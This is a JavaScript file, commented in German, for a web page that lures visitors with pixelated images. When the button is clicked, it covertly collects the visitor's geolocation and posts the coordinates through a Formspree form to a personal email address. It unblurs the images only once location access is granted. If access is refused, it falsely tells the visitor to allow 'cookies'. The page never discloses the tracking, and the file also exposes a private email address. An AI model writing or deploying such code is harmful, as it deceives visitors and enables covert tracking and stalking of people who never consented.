document.getElementById('trackBtn').addEventListener('click', function() {
    getLocation();
    showNewImages(false); // Zeigt die verpixelten Bilder an, auch wenn ein Fehler passiert
});

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => sendLocationByEmail(position),
            error => {
                showError(error);
                showNewImages(false); // Bei Fehler trotzdem verpixelte Bilder anzeigen
            }
        );
    } else {
        updateStatus("Anfrage wird von diesem Browser nicht unterstützt.");
        showNewImages(false);
    }
}

// Standort per E-Mail senden
function sendLocationByEmail(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
    sendLocationToFormspree(locationData);

    // Entferne Verpixelung nach erfolgreicher Standortermittlung
    showNewImages(true); 
}

// Standortdaten an Formspree senden
function sendLocationToFormspree(locationData) {
    const formData = new FormData();
    formData.append("email", "nejat.balta@outlook.de");
    formData.append("subject", "Standortdaten des Besuchers");
    formData.append("message", `Die Koordinaten des Besuchers: ${locationData}`);

    fetch("https://formspree.io/f/mpwplqao", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log("Standort erfolgreich gesendet");
        } else {
            console.error("Fehler beim Senden der Standortdaten", response);
        }
    })
    .catch(error => console.error("Fehler beim Senden an Formspree:", error));
}

// Fehlerbehandlung für Standortabruf
function showError(error) {
    const errorMessage = "Bitte laden Sie die Seite neu und erlauben Sie den Zugriff auf Cookies, um die Fotos und Videos anzusehen.";
    updateStatus(errorMessage);
}

// Fehlermeldung anzeigen
function updateStatus(message) {
    document.getElementById("status").innerHTML = message;
}

// Neue Bilder einfügen (verpixelt oder klar)
function showNewImages(removePixelation) {
    const imageContainer = document.getElementById("additional-images");

    // Verhindert doppeltes Einfügen von Bildern
    if (imageContainer.children.length > 0) {
        if (removePixelation) {
            document.querySelectorAll('#additional-images img').forEach(img => img.classList.remove('pixelated'));
        }
        return;
    }

    const newImages = ['bild4.jpg', 'bild5.jpg', 'bild6.jpg'];

    newImages.forEach(imageSrc => {
        const imgElement = document.createElement("img");
        imgElement.src = imageSrc;
        imgElement.alt = "Weitere Bilder";
        
        if (!removePixelation) {
            imgElement.classList.add('pixelated'); 
        }

        imageContainer.appendChild(imgElement);
    });

    document.getElementById("message").style.display = "block";
}
